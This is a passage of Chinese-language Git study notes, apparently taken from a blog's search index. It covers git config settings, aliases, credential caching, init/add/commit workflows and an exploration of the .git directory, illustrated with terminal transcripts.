--listcore.repositoryformatversion=0core.filemode=falsecore.bare=falsecore.logallrefupdates=truecore.symlinks=falsecore.ignorecase=truecore.editor=vimcore.excludesfile=~/.gitignorecore.autocrlf=trueremote.origin.url=git@github.com:BoobooWei/DBA_Git.gitremote.origin.fetch=+refs/heads/*:refs/remotes/origin/*branch.master.remote=originbranch.master.merge=refs/heads/masteralias.amend=commit --amendalias.amendf=commit --amend --no-editalias.br=branchalias.ct=commitalias.co=checkoutalias.cp=cherry-pickalias.df=diffalias.ds=diff --stagedalias.l=logalias.lg=log --graph --all --format=format:&apos;%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(bold white)— %an%C(reset)%C(bold yellow)%d%C(reset)&apos; --abbrev-commit --date=relativealias.lp=log --pretty=onelinealias.sa=stash applyalias.sh=showalias.ss=stash savealias.st=statuscolor.ui=autocolor.branch.current=yellow reversecolor.branch.local=yellowcolor.branch.remote=greencolor.status.added=yellowcolor.status.changed=greencolor.status.untracked=cyancolor.diff.meta=yellowcolor.diff.frag=magenta boldcolor.diff.commit=yellow boldcolor.diff.old=red boldcolor.diff.new=green boldcolor.diff.whitespace=red reversecolor.diff-highlight.oldnormal=red boldcolor.diff-highlight.oldhighlight=red bold 52color.diff-highlight.newnormal=green boldcolor.diff-highlight.newhighlight=green bold 22credential.helper=cache --timeout=28800rgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/GitHub/DBA_Git (master)$ git config --global --listuser.email=weiyaping@jiagouyun.comuser.name=weiyapinggui.recentrepo=C:/Users/rgwei/Desktop/jigouyun_Git/DevOps-Database-Troubleshootingrgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/GitHub/DBA_Git (master)$ git config --system --listhttp.sslcainfo=C:/Program Files/Git/mingw64/ssl/certs/ca-bundle.crtdiff.astextplain.textconv=astextplainfilter.lfs.clean=git-lfs clean -- %ffilter.lfs.smudge=git-lfs smudge -- %ffilter.lfs.required=truefilter.lfs.process=git-lfs filter-processcredential.helper=manager 4 清空global配置1234567891011121314151617181920212223242526272829303132# 通过命令查看global配置$ git config --global --listuser.email=weiyaping@jiagouyun.comuser.name=weiyapinggui.recentrepo=C:/Users/rgwei/Desktop/jigouyun_Git/DevOps-Database-Troubleshooting# 通过配置文件查看global配置rgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/GitHub/DBA_Git (master)$ cat ~/.gitconfig[user] email = weiyaping@jiagouyun.com name = weiyaping[gui][gui] recentrepo = C:/Users/rgwei/Desktop/jigouyun_Git/DevOps-Database-Troubleshooting# 清空user.namergwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/GitHub/DBA_Git (master)$ git config --global --unset user.name# 清空user.emailrgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/GitHub/DBA_Git (master)$ git config --global --unset user.email# 再次查看global配置rgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/GitHub/DBA_Git (master)$ git config --global --listgui.recentrepo=C:/Users/rgwei/Desktop/jigouyun_Git/DevOps-Database-Troubleshootingrgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/GitHub/DBA_Git (master)$ cat ~/.gitconfig[user][gui][gui] recentrepo = C:/Users/rgwei/Desktop/jigouyun_Git/DevOps-Database-Troubleshooting 5 重新配置global1234567891011rgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/GitHub/DBA_Git (master)$ git config --global user.name boobooweirgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/GitHub/DBA_Git (master)$ git config --global user.email rgweiyaping@hotmail.comrgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/GitHub/DBA_Git (master)$ git config --global --listgui.recentrepo=C:/Users/rgwei/Desktop/jigouyun_Git/DevOps-Database-Troubleshootinguser.name=boobooweiuser.email=rgweiyaping@hotmail.com git config 配置文件详解 常见的配置，具体参见官方帮助 core 核心1234[core] editor = vim excludesfile = ~/.gitignore autocrlf = true 核心设置部分包含与git相关的各种不同设置。我们设置到的部分有： editor = vim 设置要用于编辑提交消息的编辑器（如果未设置此值，git将首先尝试从环境变量VISUAL或EDITOR读取你当前的编辑器，如果获取不到，最终会使用vi）。 excludesfile = ~/.gitignore允许指定全局性质的.gitignore文件。每个git存储库都可以设置特定的项目级别的.gitignore文件，该文件指定要从版本控制中排除的文件。但很多时候，每个git存储库中的一些文件都是相同的（例如，macOS上的.DS_Store，或者当你是Python开发人员时是*.pyc），为了避免重复设置，可以设置全局性质的.gitignore，该设置就会对该用户下所有的项目都生效。 autocrlf = input。 由于Windows使用的是与Unix和MacOS不同的行结尾，如果来自不同操作系统的人员提交到同一个存储库，则可能会造成一些混乱。关于换行设置三种操作系统（windows，linux和macOS）的是不一样的：MacOS/Linux设置：autocrlf = input Windows上的autocrlf = true） alias 别名 git别名是我们日常进行git配置使用最多的一部分内容。 在git使用中，为了便捷减少输入，git提供了别名机制来将标准的git命令自定义为自己习惯使用的命令。 我们可以将git的命令设定别名为为1或2个字母的快捷方式。 12345678910111213141516[alias] amend = commit --amend amendf = commit --amend --no-edit br = branch ct = commit co = checkout cp = cherry-pick df = diff ds = diff --staged l = log lg = log --graph --all --format=format:&apos;%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(bold white)— %an%C(reset)%C(bold yellow)%d%C(reset)&apos; --abbrev-commit --date=relative lp = log --pretty=oneline sa = stash apply sh = show ss = stash save st = status 此处我们按字母顺序排列别名。注意到这个log命令lg，我们美化了log的显示，是的lg显示更加好看，简洁的图表，说明了仓库库随着时间的推移如何演变。 color 配色给你的工作终端设置一个好看的颜色也是每一个码农一直孜孜以求的目标，那就看本部分： 12345678910111213141516171819202122[color] ui = auto # UI的默认设置。它在输出直接到终端时为输出着色，但在输出重定向到管道或文件时会省略颜色控制代码，以免导致问题。分支和状态部分正在以下列方式更改git branch和git status命令的输出颜色。[color &quot;branch&quot;] current = yellow reverse local = yellow remote = green[color &quot;status&quot;] added = yellow changed = green untracked = cyan[color &quot;diff&quot;] # 在执行diff命令时候系统展示的颜色 meta = yellow frag = magenta bold commit = yellow bold old = red bold new = green bold whitespace = red reverse[color &quot;diff-highlight&quot;] oldNormal = red bold oldHighlight = red bold 52 newNormal = green bold newHighlight = green bold 22 credential 凭据12[credential] helper = cache --timeout=28800 凭据部分用来指定希望你需要默认保存的账号和密码。 默认情况下，git根本不会包存储凭据，所以每次连接时（http（s）性质的仓库）都会提示输入用户名和密用,这会很麻烦，你可以在此处设置保存户名密码，这样就可以不用每次都输入了（当然最好方式，是用ssh证书方法，即安全又方便）。 凭据一般可以通过两种方式保存，保存在带有store选项的文件中（它将使用你的凭据创建纯文本文件），或使用cache选项将它们存储在内存中。当然根据你系统不同，还可以使用第三方的方式，比如MacOS下的osxkeychain，Windows下的Git Credential Manager）。 此处我们使用的是，通过内存cache的方式，默认是15分钟，此处我们设置为8小时。 push 推送12[push]default = current git push命令中包含分支的名称，如果你没有添加，可能导致意外的行为（例如我正在开发dev分支，但不小心，push到了master分支）。为了防止这种错误，我给push设置了default = current选项。现在，如果忘记包含分支的名称，git将尝试推送到具有相同名称的分支。如果它在远程库中找不到具有相同名称的分支，会新创建一个。 课后实践请动⼿⽐⼀⽐，local 和global 的优先级。 在 Git 命令⾏⽅式下，⽤ init 创建⼀个 Git 仓库。 cd 到 repo 中。 配置 global 和 local 两个级别的 user.name 和 user.email。 创建空的 commit$ git commit –allow-empty -m ‘Initial’ ⽤ log 看 commit 信息，Author 的 name 和 email 是什么？$ git log 123456789101112131415161718192021222324252627282930313233343536373839404142rgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/20190212$ git init my_repoInitialized empty Git repository in C:/Users/rgwei/Desktop/20190212/my_repo/.git/rgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/20190212$ lltotal 0drwxr-xr-x 1 rgwei 197121 0 2月 12 13:31 my_repo/rgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/20190212$ cd my_repo/rgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/20190212/my_repo (master)$ git config --local user.name weiyapingrgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/20190212/my_repo (master)$ git config --local user.email weiyaping@jiagouyun.comrgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/20190212/my_repo (master)$ git commit --allow-empty -m &apos;Initial&apos;[master (root-commit) ca14e14] Initialrgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/20190212/my_repo (master)$ git logcommit ca14e1450e7b37275b732ea7184687b3be709ff3 (HEAD -&gt; master)Author: weiyaping &lt;weiyaping@jiagouyun.com&gt;Date: Tue Feb 12 13:32:36 2019 +0800 Initialrgwei@DESKTOP-G9S0U3G MINGW64 ~/Desktop/20190212/my_repo (master)$ cat .git/config[core] repositoryformatversion = 0 filemode = false bare = false logallrefupdates = true symlinks = false ignorecase = true[user] name = weiyaping email = weiyaping@jiagouyun.com","link":"/2019/05/12/DBA_Git/Chapter01_GitBasics/03_%E4%BD%BF%E7%94%A8Git%E4%B9%8B%E5%89%8D%E9%9C%80%E8%A6%81%E5%81%9A%E7%9A%84%E6%9C%80%E5%B0%8F%E9%85%8D%E7%BD%AE/"},{"title":"玩转Git三剑客学习笔记-第04课-创建第一个仓库并配置local用户信息","text":"建 Git 仓库场景1： 将已有的项目代码纳入 Git 管理Git 基本命令12$ cd dir$ git init 练习1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# 创建目录$ mkdir git_learn_1# 进入目录$ cd git_learn_1/# 查看目录下的所有文件$ ls -altotal 40drwxr-xr-x 1 rgwei 197121 0 3月 10 12:17 ./drwxr-xr-x 1 rgwei 197121 0 3月 10 12:17 ../# 初始化仓库$ git initInitialized empty Git repository in C:/Users/rgwei/AppData/Local/Temp/git_learn_1/.git/# 看到初始化后的目录中多了一个隐藏目录.git$ ls -altotal 44drwxr-xr-x 1 rgwei 197121 0 3月 10 12:18 ./drwxr-xr-x 1 rgwei 197121 0 3月 10 12:17 ../drwxr-xr-x 1 rgwei 197121 0 3月 10 12:18 .git/# 查看.git目录下的具体文件$ ls -la .gittotal 11drwxr-xr-x 1 rgwei 197121 0 3月 10 12:18 ./drwxr-xr-x 1 rgwei 197121 0 3月 10 12:18 ../-rw-r--r-- 1 rgwei 197121 130 3月 10 12:18 config-rw-r--r-- 1 rgwei 197121 73 3月 10 12:18 description-rw-r--r-- 1 rgwei 197121 23 3月 10 12:18 HEADdrwxr-xr-x 1 rgwei 197121 0 3月 10 12:18 hooks/drwxr-xr-x 1 rgwei 197121 0 3月 10 12:18 info/drwxr-xr-x 1 rgwei 197121 0 3月 10 12:18 objects/drwxr-xr-x 1 rgwei 197121 0 3月 10 12:18 refs/# 创建一个文件readme$ touch readme# 将reamde添加到git跟踪$ git add readme# 查看git跟踪的明细$ git statusOn branch masterInitial commitChanges to be committed: (use &quot;git rm --cached &lt;file&gt;...&quot; to unstage) new file: readme# 提交变更明细到本地$ git commit -m &apos;add readme&apos;[master (root-commit) 1c244eb] add readme 1 file changed, 0 insertions(+), 0 deletions(-) create mode 100644 readme# 提交变更到远程$ git pushfatal: No configured push destination.Either specify the URL from the command-line or configure a remote repository using git remote add &lt;name&gt; &lt;url&gt;and then push using the remote name git push &lt;name&gt;# 由于没有配置远程仓库，因此此处提示需要先添加远程分支，后续会学习 场景2： 新建的项目直接用 Git 管理Git 基本命令123$ cd dir$ git init your_project$ cd your_project 练习12345678910111213# 创建新的项目$ git init git_learn_2Initialized empty Git repository in C:/Users/rgwei/AppData/Local/Temp/git_learn_2/.git/# 进入该目录$ cd git_learn_2/# 查看明细$ ll -altotal 44drwxr-xr-x 1 rgwei 197121 0 3月 10 12:44 ./drwxr-xr-x 1 rgwei 197121 0 3月 10 12:44 ../drwxr-xr-x 1 rgwei 197121 0 3月 10 12:44 .git/ git init基础命令总结名称git-init - 创建一个空的Git存储库或重新初始化现有存储库 概要123git init [-q | --quiet] [--bare] [--template = &lt;template_directory&gt;] [--separate-git-dir &lt;git dir&gt;] [--shared [= &lt;permissions&gt;]] [目录] git init 创建一个空的Git存储库或重新初始化现有存储库 git init --help 查看帮助文档 git init -q 仅打印错误和警告消息; 所有其他输出都将被抑制。 git config常用配置12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758[core] repositoryformatversion = 0 filemode = false bare = false logallrefupdates = true symlinks = false ignorecase = true editor = vim excludesfile = ~/.gitignore autocrlf = true[remote &quot;origin&quot;] url = git@github.com:xxxx/xxxx.git fetch = +refs/heads/*:refs/remotes/origin/*[branch &quot;master&quot;] remote = origin merge = refs/heads/master[alias] amend = commit --amend amendf = commit --amend --no-edit br = branch ct = commit co = checkout cp = cherry-pick df = diff ds = diff --staged l = log lg = log --graph --all --format=format:&apos;%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(bold white)�� %an%C(reset)%C(bold yellow)%d%C(reset)&apos; --abbrev-commit --date=relative lp = log --pretty=oneline sa = stash apply sh = show ss = stash save st = status[color] ui = auto [color &quot;branch&quot;] current = yellow reverse local = yellow remote = green[color &quot;status&quot;] added = yellow changed = green untracked = cyan[color &quot;diff&quot;] meta = yellow frag = magenta bold commit = yellow bold old = red bold new = green bold whitespace = red reverse[color &quot;diff-highlight&quot;] oldNormal = red bold oldHighlight = red bold 52 newNormal = green bold newHighlight = green bold 22[credential] helper = cache --timeout=28800","link":"/2019/05/12/DBA_Git/Chapter01_GitBasics/04_%E5%88%9B%E5%BB%BA%E7%AC%AC%E4%B8%80%E4%B8%AA%E4%BB%93%E5%BA%93%E5%B9%B6%E9%85%8D%E7%BD%AElocal%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF/"},{"title":"玩转Git三剑客学习笔记-第05课-通过几次commit来认识工作区和暂存区","text":"往仓库里添加文件 4 次提交，一个像模像样的静态页面生成了 123graph LRA(工作目录) -- git add files --- B(暂存区);B(暂存区) -- git commit --- C(版本历史); 课堂练习 练习的目的：熟悉git的提交流程 加入index.html和git-logo 加入style.css 加入scripts.js 修改index.html和style.css 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# 下载稍后需要的文件，并解压$ curl -O &quot;https://github.com/BoobooWei/DBA_Git/blob/master/info/git_learning_master_6_commits-27d2f8146eabcf2782e87ce445b8469cc1accc73.zip&quot;$ unzip git_learning_master_6_commits-27d2f8146eabcf2782e87ce445b8469cc1accc73.zip$ git init git_learning$ cd git_learning$ ll -altotal 44drwxr-xr-x 1 rgwei 197121 0 3月 10 13:07 ./drwxr-xr-x 1 rgwei 197121 0 3月 10 13:28 ../drwxr-xr-x 1 rgwei 197121 0 3月 10 13:07 .git/# 复制index.html到git_learning目录中$ cp ../git_learning_master_6_commits-27d2f8146eabcf2782e87ce445b8469cc1accc73/index.html index.html# 复制images目录到git_learning目录中$ cp -r ../git_learning_master_6_commits-27d2f8146eabcf2782e87ce445b8469cc1accc73/images/ .$ lltotal 4drwxr-xr-x 1 rgwei 197121 0 3月 10 13:35 images/-rw-r--r-- 1 rgwei 197121 1303 3月 10 13:35 index.html# 查看git仓库中存在没有被git管理的文件$ git statusOn branch masterInitial commitUntracked files: (use &quot;git add &lt;file&gt;...&quot; to include in what will be committed) images/ index.htmlnothing added to commit but untracked files present (use &quot;git add&quot; to track)# 通过git add命令使得git可以管理index.html和images文件$ git add index.html imageswarning: LF will be replaced by CRLF in index.html.The file will have its original line endings in your working directory.# 再次查看git管理情况$ git statusOn branch masterInitial commitChanges to be committed: (use &quot;git rm --cached &lt;file&gt;...&quot; to unstage) new file: images/git-logo.png new file: index.html# 看到已经将images和index.html添加到git仓库的暂存处 通过浏览器打开本地的index.html文件，如下图所示 12345678910111213141516171819202122232425262728293031323334353637# 创建styles目录$ mkdir styles# 将style.css复制到仓库中的styles目录下$ cp ../git_learning_master_6_commits-27d2f8146eabcf2782e87ce445b8469cc1accc73/styles/style.css styles/$ git statusOn branch masterInitial commitChanges to be committed: (use &quot;git rm --cached &lt;file&gt;...&quot; to unstage) new file: images/git-logo.png new file: index.htmlUntracked files: (use &quot;git add &lt;file&gt;...&quot; to include in what will be committed) styles/# 将styles目录添加到暂存区，让git管理起来$ git add styleswarning: LF will be replaced by CRLF in styles/style.css.The file will have its original line endings in your working directory.$ git statusOn branch masterInitial commitChanges to be committed: (use &quot;git rm --cached &lt;file&gt;...&quot; to unstage) new file: images/git-logo.png new file: index.html new file: styles/style.css 添加了css文件后，刷新网页 123456789101112131415161718192021222324252627282930313233343536373839404142# 添加js目录$ mkdir js# 复制动画文件$ cp ../git_learning_master_6_commits-27d2f8146eabcf2782e87ce445b8469cc1accc73/js/script.js js$ git statusOn branch masterInitial commitChanges to be committed: (use &quot;git rm --cached &lt;file&gt;...&quot; to unstage) new file: images/git-logo.png new file: index.html new file: styles/style.cssUntracked files: (use &quot;git add &lt;file&gt;...&quot; to include in what will be committed) js/# 将js目录添加到暂存区$ git add jswarning: LF will be replaced by CRLF in js/script.js.The file will have its original line endings in your working directory.# 查看状态$ git statusOn branch masterInitial commitChanges to be committed: (use &quot;git rm --cached &lt;file&gt;...&quot; to unstage) new file: images/git-logo.png new file: index.html new file: js/script.js new file: styles/style.css 添加动画后，可以点击展开明细 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# index.html 文件中增加的代码&lt;footer&gt; &lt;p&gt; &lt;a href=&quot;https://github.com/TTN-js/unforGITtable&quot;&gt; 参考项目 01&lt;/a&gt; &lt;/p&gt;&lt;/footer&gt;# style.css 文件中增加的代码footer{ right: 0; bottom: 0; position: relative; padding: 10px 1rem 10px 0; margin-top: 50px; font-size: 0.7em; text-align: right;}footer p{ margin-bottom:0;}$ vim styles/style.css$ vim index.html$ git statusOn branch masterChanges not staged for commit: (use &quot;git add &lt;file&gt;...&quot; to update what will be committed) (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory) modified: index.html modified: styles/style.cssno changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)# 将所有变更保存到暂存区$ git add -u$ git statusOn branch masterChanges to be committed: (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage) modified: index.html modified: styles/style.css$ git commit -m &apos;修改格式&apos;[master ca1cf5a] 修改格式 2 files changed, 19 insertions(+) 添加参考连接地址 git add 基础命令git-add - 将文件内容添加到索引（暂存区）中 git add 新增 删除 修改 git add . ✔ ✔ git add -u ✔ ✔ git add -A ✔ ✔ ✔ git add -u：将文件的修改、文件的删除，添加到暂存区。 git add .：将文件的修改，文件的新建，添加到暂存区。 git add -A：将文件的修改，文件的删除，文件的新建，添加到暂存区。 git commit 基础命令git-commit - 记录对存储库的更改 123456git commit [-a | --interactive | --patch] [-s] [-v] [-u&lt;mode&gt;] [--amend] [--dry-run] [(-c | -C | --fixup | --squash) &lt;commit&gt;] [-F &lt;file&gt; | -m &lt;msg&gt;] [--reset-author] [--allow-empty] [--allow-empty-message] [--no-verify] [-e] [--author=&lt;author&gt;] [--date=&lt;date&gt;] [--cleanup=&lt;mode&gt;] [--[no-]status] [-i | -o] [-S[&lt;keyid&gt;]] [--] [&lt;file&gt;…​] git commit -m &apos;说明文字&apos; 有趣的统计1git log --date=iso | perl -nalE &apos;if (/^Date:\\s+[\\d-]{10}\\s(\\d{2})/) { say $1+0 }&apos; | sort | uniq -c|perl -MList::Util=max -nalE &apos;$h{$F[1]} = $F[0]; }{ $m = max values %h; foreach (0..23) { $h{$_} = 0 if not exists $h{$_} } foreach (sort {$a &lt;=&gt; $b } keys %h) { say sprintf &quot;%02d - %4d %s&quot;, $_, $h{$_}, &quot;*&quot;x ($h{$_} / $m * 50); }&apos;","link":"/2019/05/12/DBA_Git/Chapter01_GitBasics/05_%E9%80%9A%E8%BF%87%E5%87%A0%E6%AC%A1commit%E6%9D%A5%E8%AE%A4%E8%AF%86%E5%B7%A5%E4%BD%9C%E5%8C%BA%E5%92%8C%E6%9A%82%E5%AD%98%E5%8C%BA/"},{"title":"玩转Git三剑客学习笔记-第06课-给文件重命名的简便方法]","text":"给文件重命名1234git mv a.py b.pygit add -Agit commit -m &apos;move a.py b.pygit push 基础命令 git mv重命名时如果遇到大小写变更的，需要将git设置为区分大小写。 123执行 git mv readme Rename ，也报 fatal：destination exists的错。我执行 git config core.ignorecase false ，发现没起作用，git还是对大小写不敏感。我再执行 git config core.ignorecase true，结果了。","link":"/2019/05/12/DBA_Git/Chapter01_GitBasics/06_%E7%BB%99%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8D%E7%9A%84%E7%AE%80%E4%BE%BF%E6%96%B9%E6%B3%95/"},{"title":"玩转Git三剑客学习笔记-第09课-探密.git目录","text":"探密.git目录 实践和理解 文件 COMMIT_EDITMSG 文件 HEAD 文件 index git reset --soft命令 git cat-file命令 什么是指纹？ 探密.git目录 HEAD：指向当前的工作路径 config：存放本地仓库（local）相关的配置信息。 refs/heads:存放分支 refs/tags:存放tag，又叫里程牌 （当这次commit是具有里程碑意义的 比如项目1.0的时候 就可以打tag） objects：存放对象 .git/objects/ 文件夹中的子文件夹都是以哈希值的前两位字符命名 每个object由40位字符组成，前两位字符用来当文件夹，后38位做文件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960MacBook-Pro-4:git_le booboo$ tree .git.git├── COMMIT_EDITMSG //├── HEAD├── branches├── config├── description├── hooks│   ├── applypatch-msg.sample│   ├── commit-msg.sample│   ├── fsmonitor-watchman.sample│   ├── post-update.sample│   ├── pre-applypatch.sample│   ├── pre-commit.sample│   ├── pre-push.sample│   ├── pre-rebase.sample│   ├── pre-receive.sample│   ├── prepare-commit-msg.sample│   └── update.sample├── index├── info│   └── exclude├── logs│   ├── HEAD│   └── refs│   └── heads│   ├── master│   └── temp├── objects│   ├── 36│   │   └── 9fc63d77b8d13dd29a21037256cb2690c15a82│   ├── 6f│   │   └── 47cef9a80991888e82e73aa5b78f7a784f345e│   ├── 8c│   │   └── 0b88e3e718781463cdc91c2b1367cdfa4fd293│   ├── 91│   │   └── b776cdad383885027c6655bbe4f85c00e17469│   ├── b3│   │   └── 02937d18a748f0e071c2c42712d2b18b0eeb1a│   ├── c1│   │   └── 9ae052e1588c855701d7aad3f35d2f361d4c1a│   ├── c4│   │   └── 744d9f2f4643646721d275f31ba421907d7fb4│   ├── ce│   │   └── 013625030ba8dba906f756967f9e9ca394464a│   ├── e6│   │   └── 9de29bb2d1d6434b8b29ae775ad8c2e48c5391│   ├── f2│   │   └── 23b4d31b661bdbe5947c862ba202991202fbd8│   ├── f5│   │   └── 634fdcfdc1b48a30b160b85d8f2aed5f3a60b6│   ├── info│   └── pack└── refs ├── heads │   ├── master │   └── temp └── tags23 directories, 33 files 实践和理解文件 COMMIT_EDITMSG.git/COMMIT_EDITMSG文件中记录了上一次提交时的注释信息；与分支无关。 查看文件的类型为ASCII text； 12345MacBook-Pro-4:git_le booboo$ ls -l .git/COMMIT_EDITMSG-rw-r--r-- 1 booboo staff 10 4 6 23:50 .git/COMMIT_EDITMSGMacBook-Pro-4:git_le booboo$ file .git/COMMIT_EDITMSG.git/COMMIT_EDITMSG: ASCII text 第一次查看文件中记录的明细内容为modify 20190406； 12MacBook-Pro-4:git_le booboo$ cat .git/COMMIT_EDITMSGmodify 20190406 将分支从master切换至temp后，查看文件内容没有变化； 1234MacBook-Pro-4:git_le booboo$ git checkout tempSwitched to branch &apos;temp&apos;MacBook-Pro-4:git_le booboo$ cat .git/COMMIT_EDITMSGmodify 20190406 修改temp分支中的文件temp.txt； 1MacBook-Pro-4:git_le booboo$ echo 20190406temp_test &gt; temp.txt 提交变更至temp分支； 1234MacBook-Pro-4:git_le booboo$ git add -AMacBook-Pro-4:git_le booboo$ git commit -m &apos;temp_test&apos;[temp 49c201f] temp_test 1 file changed, 1 insertion(+) 查看文件内容，变更为最近一次提交的内容temp_test； 12MacBook-Pro-4:git_le booboo$ cat .git/COMMIT_EDITMSGtemp_test 切换分支至master后，第四次查看文件内容，内容仍然为最近一次在temp分支提交的内容temp_test。 1234MacBook-Pro-4:git_le booboo$ git checkout masterSwitched to branch &apos;master&apos;MacBook-Pro-4:git_le booboo$ cat .git/COMMIT_EDITMSGtemp_test 文件 HEAD.git/HEAD文件指向当前的工作路径；记录了当前的分支名。 通过git branch命令查看当前分支； 123MacBook-Pro-4:git_le booboo$ git branch* master temp 当前的分支为master，本地还有一个temp分支； 通过.git/HEAD文件查看当前分支； 12MacBook-Pro-4:git_le booboo$ cat .git/HEADref: refs/heads/master 通过文件查看到当前分支为master； 该文件中记录了当前master分支的指纹信息记录的文件路径为.git/refs/heads/master； 1234MacBook-Pro-4:git_le booboo$ ls -l .git/refs/heads/master-rw-r--r-- 1 booboo staff 41 4 6 23:01 .git/refs/heads/masterMacBook-Pro-4:git_le booboo$ cat .git/refs/heads/masterf5634fdcfdc1b48a30b160b85d8f2aed5f3a60b6 当前master分支最新的一次提交的哈希值为f5634fdcfdc1b48a30b160b85d8f2aed5f3a60b6； 切换至temp分支； 12MacBook-Pro-4:git_le booboo$ git checkout tempSwitched to branch &apos;temp&apos; 通过git branch命令查看当前分支； 123MacBook-Pro-4:git_le booboo$ git branch master* temp 当前分支为temp； 通过.git/HEAD文件查看当前分支； 12MacBook-Pro-4:git_le booboo$ cat .git/HEADref: refs/heads/temp 通过文件查看到当前分支为temp； 该文件中记录了当前temp分支的指纹信息记录的文件路径为.git/refs/heads/temp； 1234MacBook-Pro-4:git_le booboo$ ls -l .git/refs/heads/temp-rw-r--r-- 1 booboo staff 41 4 6 23:50 .git/refs/heads/tempMacBook-Pro-4:git_le booboo$ cat .git/refs/heads/temp49c201fe8ec14b9bc570db7a53f343d8f3875521 当前temp分支最新的一次提交的哈希值为f5634fdcfdc1b48a30b160b85d8f2aed5f3a60b6； 通过git branch -av命令查看各个分支最新的一次提交哈希值前7位； 123MacBook-Pro-4:git_le booboo$ git branch -av* master f5634fd modify 20190406 temp 49c201f temp_test 文件 index 创建一个新文件，并查看索引文件明细； 123456789101112131415161718192021222324252627282930313233343536MacBook-Pro-4:git_le booboo$ touch 20190411.mdMacBook-Pro-4:git_le booboo$ git ls-files --stage100644 ce013625030ba8dba906f756967f9e9ca394464a 0 20190403.md100644 b302937d18a748f0e071c2c42712d2b18b0eeb1a 0 readme.mdMacBook-Pro-4:git_le booboo$ git add 20190411.mdMacBook-Pro-4:git_le booboo$ git ls-files --stage100644 ce013625030ba8dba906f756967f9e9ca394464a 0 20190403.md100644 e69de29bb2d1d6434b8b29ae775ad8c2e48c5391 0 20190411.md100644 b302937d18a748f0e071c2c42712d2b18b0eeb1a 0 readme.mdMacBook-Pro-4:git_le booboo$ hexdump -c .git/index0000000 D I R C \\0 \\0 \\0 002 \\0 \\0 \\0 003 \\ ? \\a 0060000010 004 ? ? ? \\ ? \\a 006 004 ? ? ? 001 \\0 \\0 0040000020 \\0 &apos; 017 ? \\0 \\0 201 ? \\0 \\0 001 ? \\0 \\0 \\0 0240000030 \\0 \\0 \\0 006 ? 001 6 % 003 \\v ? ? ? 006 ? V0000040 226 177 236 234 ? 224 F J \\0 \\v 2 0 1 9 0 40000050 0 3 . m d \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\ ? 5 0000060 \\r ? ? ? \\ ? 4 ? 016 023 215 , 001 \\0 \\0 0040000070 \\0 ) ? ? \\0 \\0 201 ? \\0 \\0 001 ? \\0 \\0 \\0 0240000080 \\0 \\0 \\0 \\0 ? 235 ? 233 ? ? ? C K 213 ) ?0000090 w Z ? ? ? 214 S 221 \\0 \\v 2 0 1 9 0 400000a0 1 1 . m d \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\ ? % ?00000b0 % ? ` 4 \\ ? % ? % ? ` 4 001 \\0 \\0 00400000c0 \\0 # 026 * \\0 \\0 201 ? \\0 \\0 001 ? \\0 \\0 \\0 02400000d0 \\0 \\0 \\0 003 ? 002 223 } 030 ? H ? ? q ? ?00000e0 &apos; 022 ? ? 213 016 ? 032 \\0 \\t r e a d m e00000f0 . m d \\0 T R E E \\0 \\0 \\0 006 \\0 - 1 0000100 0 \\n ? ? ? Q ? 230 H Q 220 2 1 232 N 2030000110 ? ? : ? L 236 0000116MacBook-Pro-4:git_le booboo$ git ls-files --stage100644 ce013625030ba8dba906f756967f9e9ca394464a 0 20190403.md100644 e69de29bb2d1d6434b8b29ae775ad8c2e48c5391 0 20190411.md100644 b302937d18a748f0e071c2c42712d2b18b0eeb1a 0 readme.MacBook-Pro-4:git_le booboo$ git cat-file -p b302937d18a7le我们可以看到文件新增并git add之后，index文件中新增对该文件的索引信息。 git cat-file -p命令可以看到文件的内容。 删除git缓冲区的记录，索引也被删除； 12345MacBook-Pro-4:git_le booboo$ git rm --cache 20190411.mdrm &apos;20190411.md&apos;MacBook-Pro-4:git_le booboo$ git ls-files --stage100644 ce013625030ba8dba906f756967f9e9ca394464a 0 20190403.md100644 b302937d18a748f0e071c2c42712d2b18b0eeb1a 0 readme.md 修改git指针实现回退或重演的功能； 123456789101112131415161718192021MacBook-Pro-4:git_le booboo$ git log --oneline -n4f5634fd (HEAD -&gt; master) modify 20190406f223b4d add 20190403.mdc4744d9 add readme.mdMacBook-Pro-4:git_le booboo$ git ls-files --stage100644 ce013625030ba8dba906f756967f9e9ca394464a 0 20190403.md100644 b302937d18a748f0e071c2c42712d2b18b0eeb1a 0 readme.mdMacBook-Pro-4:git_le booboo$ git reset --soft c4744d9MacBook-Pro-4:git_le booboo$ git log --oneline -n4c4744d9 (HEAD -&gt; master) add readme.mdMacBook-Pro-4:git_le booboo$ git ls-files --stage100644 ce013625030ba8dba906f756967f9e9ca394464a 0 